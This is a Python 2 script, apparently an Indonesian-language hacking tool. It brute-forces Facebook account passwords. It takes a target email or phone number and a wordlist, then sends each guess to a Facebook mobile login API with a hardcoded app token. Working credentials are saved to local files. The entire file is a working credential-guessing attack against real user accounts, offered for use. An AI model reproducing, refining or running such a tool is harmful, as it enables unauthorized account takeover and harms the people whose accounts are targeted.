#!/bin/python

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

def keluar():
    print '\033[1;33m[\033[1;32m!\033[1;33m] \x1b[1;91m Exit\033[1;36m'
    os.sys.exit()
    
N = '\033[0m'
D = '\033[90m'
W = '\033[1;37m'
B = '\033[1;34m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'

def brute():
	try:
            email = raw_input('\033[1;33m[\033[1;32m?\033[1;33m] \033[1;36m ID/Email/Nomor Target ')
            passw = raw_input('\033[1;33m[\033[1;32m?\033[1;33m] \033[1;36m WordList (Contoh : list.txt) ')
            total = open(passw, 'r')
            total = total.readlines()
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Target ' + email
            print '\033[1;33m[\033[1;32m+\033[1;33m]  Total\033[1;36m ' + str(len(total)) + ' \033[1;32m Password'
            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Mohon Tunggu'
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92m Try \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print ' \033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Ditemukan.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Username \033[1;32m ' + email
                        print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Password \033[1;32m ' + pw
                        keluar() 
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Ditemukan'
                            print 52 * '\x1b[1;97m\xe2\x95\x90'
                            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Mungkin Akun Terkena Checkpoint'
                            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Username \033[1;32m ' + email
                            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Password \033[1;32m' + pw
                            keluar()
                except KeyboardInterrupt:
                    print 'Berhenti'
                    time.sleep(1)

        except IOError:
            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m WordList Tidak Ditemukan'
            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Sepertinya Anda Tidak Memiliki WordList'
            print '\033[1;33m[\033[1;32m!\033[1;33m] \033[1;36m Buat WordList Terlebih Dahulu'
            keluar()
   
   
pilih = raw_input("\033[1;33m[\033[1;32m?\033[1;33m] \033[1;36m Pilih 1/2? ")
if pilih == "1" or pilih == "01":
   brute()
elif pilih == "2" or pilih == "02":
   keluar()
else:
   print (" Pilih Yang Benar")